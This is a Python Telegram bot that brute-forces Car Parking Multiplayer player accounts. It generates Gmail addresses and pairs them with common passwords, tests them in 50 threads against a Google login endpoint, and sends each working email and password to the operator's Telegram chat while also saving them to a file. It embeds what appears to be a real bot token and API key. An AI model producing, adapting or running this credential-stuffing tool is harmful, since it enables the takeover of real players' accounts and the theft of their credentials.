import urllib.request
import urllib.parse
import json
import random
import time
import sys
import os
import threading
import string
from flask import Flask
import telebot
from telebot import types

# ================== الإعدادات ==================
BOT_TOKEN = "8807194549:AAGcUNewT82vYW7rxdngAdSYOTlvCvYUOo8"
ADMIN_ID = "7075895496"
THREADS = 50

# ================== الحالة ==================
good = 0
bad = 0
total = 0
start_time = time.time()
lock = threading.Lock()
STOP_FLAG = threading.Event()
RUNNING = False

# ================== Flask ==================
app = Flask(__name__)

@app.route("/")
def index():
    return "Car Parking Checker Bot is running!"

def keep_alive():
    t = threading.Thread(target=lambda: app.run(host="0.0.0.0", port=10000))
    t.daemon = True
    t.start()

# ================== البوت ==================
bot = telebot.TeleBot(BOT_TOKEN)

# ================== دوال HTTP ==================
def http_post(url, json_data=None, headers=None, timeout=10):
    try:
        data = json.dumps(json_data).encode('utf-8') if json_data else None
        req = urllib.request.Request(url, data=data, method='POST')
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode('utf-8', errors='ignore')
            return resp.status, body
    except urllib.error.HTTPError as e:
        try:
            body = e.read().decode('utf-8', errors='ignore')
        except:
            body = ''
        return e.code, body
    except:
        return 0, ''

def http_get(url, params=None, timeout=5):
    try:
        if params:
            url = url + '?' + urllib.parse.urlencode(params)
        req = urllib.request.Request(url, method='GET')
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode('utf-8', errors='ignore')
    except:
        return 0, ''

# ================== جلب عدد السيارات ==================
def get_car_count(id_token):
    car_count = 0
    try:
        url = "https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2"
        headers = {
            "authorization": f"Bearer {id_token}",
            "content-type": "application/json",
            "user-agent": "CarParking/265 CFNetwork/3860.700.1 Darwin/25.6.0"
        }
        status, body = http_post(url, {"data": None}, headers, timeout=10)
        if status == 200:
            data = json.loads(body)
            if 'result' in data:
                cars_data = json.loads(data['result'])
                if isinstance(cars_data, list):
                    car_count = len(cars_data)
                elif isinstance(cars_data, dict):
                    car_count = len(cars_data.get('cars', []))
    except:
        pass
    return car_count

# ================== إرسال الصيد ==================
def send_hit(email, password, car_count):
    global total
    with lock:
        total += 1

    message = f'''🚗 ايسكو جابلك حساب حبيبي 😎
━━━━━━━━━━━━━━━━━━
📧 الايميل: {email}
🔑 الباسورد: {password}
🚗 عدد السيارات: {car_count}
━━━━━━━━━━━━━━━━━━
✅ ايسكو
المطور @jdbd_cx
 قناة المطور @jxbxnm2'''

    try:
        bot.send_message(ADMIN_ID, message)
    except:
        pass

    try:
        with open('Hits_carparking.txt', 'a', encoding='utf-8') as f:
            f.write(f'{email}:{password}:{car_count}\n')
    except:
        pass

# ================== فحص الحساب ==================
def check_account(email, password):
    global good, bad
    try:
        login_url = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
        login_payload = {
            "email": email,
            "password": password,
            "returnSecureToken": True,
            "clientType": "CLIENT_TYPE_IOS"
        }
        login_headers = {
            "User-Agent": "CarParking/265 CFNetwork/3860.700.1 Darwin/25.6.0",
            "Content-Type": "application/octet-stream",
            "X-Unity-Version": "2022.3.62f2"
        }

        status, body = http_post(login_url, login_payload, login_headers, timeout=10)

        if status == 200:
            res_json = json.loads(body)
            id_token = res_json.get('idToken')
            local_id = res_json.get('localId')
            if id_token and local_id:
                car_count = get_car_count(id_token)
                with lock:
                    good += 1
                send_hit(email, password, car_count)
                return True
        else:
            try:
                error_json = json.loads(body)
                error_msg = error_json.get('error', {}).get('message', '')
                if error_msg in ['EMAIL_NOT_FOUND', 'INVALID_PASSWORD', 'USER_DISABLED']:
                    with lock:
                        bad += 1
            except:
                pass
    except:
        pass
    return False

# ================== توليد بيانات ==================
FIRST_NAMES = ['john', 'mike', 'sara', 'ali', 'omar', 'lina', 'adam', 'huda', 'kareem', 'noor',
               'ahmed', 'mona', 'yousef', 'rana', 'khaled', 'dina', 'sami', 'lara', 'zaid', 'aya']

WORDS = ['cool', 'fast', 'dark', 'king', 'star', 'fire', 'wolf', 'lion', 'sky', 'pro',
         'hero', 'ghost', 'ninja', 'tiger', 'shadow', 'storm', 'blade', 'cyber', 'alpha', 'omega']

PASSWORDS = ['12345678', '123456789', 'password', '123456', '123123', '1234567',
             '00000000', '12345', 'qwerty', '1234567890']

def rand_str(n, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choices(chars, k=n))

def generate_credentials():
    pattern = random.randint(0, 3)
    if pattern == 0:
        name = random.choice(FIRST_NAMES) + rand_str(random.randint(1, 3), string.digits)
    elif pattern == 1:
        name = random.choice(FIRST_NAMES) + rand_str(random.randint(0, 2), string.digits)
    elif pattern == 2:
        name = random.choice(WORDS) + random.choice(['', '123', '2023', '2024'])
    else:
        name = 'user' + str(random.randint(1000, 9999))

    email = name + '@gmail.com'
    password = random.choice(PASSWORDS)
    return email, password

# ================== العامل ==================
def worker():
    while not STOP_FLAG.is_set():
        email, password = generate_credentials()
        check_account(email, password)
        time.sleep(random.uniform(0.01, 0.05))

# ================== التشغيل ==================
def run_checker():
    global RUNNING, good, bad, total, start_time
    with lock:
        good = 0
        bad = 0
        total = 0
        start_time = time.time()
        
    RUNNING = True
    STOP_FLAG.clear()
    
    bot.send_message(ADMIN_ID, "🚀 بدأ صيد Car Parking!\nانتظر النتائج...")

    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)

    while RUNNING and not STOP_FLAG.is_set():
        time.sleep(600)
        if not STOP_FLAG.is_set():
            elapsed = time.time() - start_time
            hours = int(elapsed // 3600)
            minutes = int((elapsed % 3600) // 60)
            rate = total / elapsed if elapsed > 0 else 0
            bot.send_message(ADMIN_ID, f"📊 إحصائيات:\n✅ Good: {good}\n❌ Bad: {bad}\n📈 Total: {total}\n⚡ Speed: {rate:.1f}/s\n⏱️ الوقت المنقضي: {hours}h {minutes}m")

    RUNNING = False
    bot.send_message(ADMIN_ID, f"🏁 انتهى الصيد!\n✅ Good: {good}\n❌ Bad: {bad}\n📈 Total: {total}")

# ================== أوامر البوت ==================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if str(message.chat.id) != ADMIN_ID and str(message.from_user.id) != ADMIN_ID:
        bot.reply_to(message, "عذراً، هذا البوت خاص.")
        return
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn_start = types.KeyboardButton("▶️ بدء الصيد")
    btn_stop = types.KeyboardButton("🛑 إيقاف الصيد")
    btn_stats = types.KeyboardButton("📊 الإحصائيات")
    markup.add(btn_start, btn_stop, btn_stats)
    
    bot.send_message(message.chat.id, "أهلاً بك في بوت Car Parking (ايسكو).\nاختر من الأزرار تحت:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "▶️ بدء الصيد")
def start_hunting(message):
    if RUNNING:
        bot.reply_to(message, "⚠️ الصيد شغال حالياً.")
        return
    threading.Thread(target=run_checker, daemon=True).start()

@bot.message_handler(func=lambda message: message.text == "🛑 إيقاف الصيد")
def stop_hunting(message):
    global RUNNING
    if not RUNNING:
        bot.reply_to(message, "⚠️ الصيد متوقف بالفعل.")
        return
    STOP_FLAG.set()
    RUNNING = False
    bot.reply_to(message, "🛑 تم إيقاف الصيد.")

@bot.message_handler(func=lambda message: message.text == "📊 الإحصائيات")
def send_stats(message):
    global good, bad, total, start_time
    elapsed = time.time() - start_time
    hours = int(elapsed // 3600)
    minutes = int((elapsed % 3600) // 60)
    rate = total / elapsed if elapsed > 0 else 0
    bot.send_message(ADMIN_ID, f"📊 إحصائيات مباشرة:\n✅ Good: {good}\n❌ Bad: {bad}\n📈 Total: {total}\n⚡ Speed: {rate:.1f}/s\n⏱️ الوقت المنقضي: {hours}h {minutes}m")

# ================== تشغيل ==================
if __name__ == "__main__":
    keep_alive()
    print("Car Parking Bot is running...")
    bot.infinity_polling()
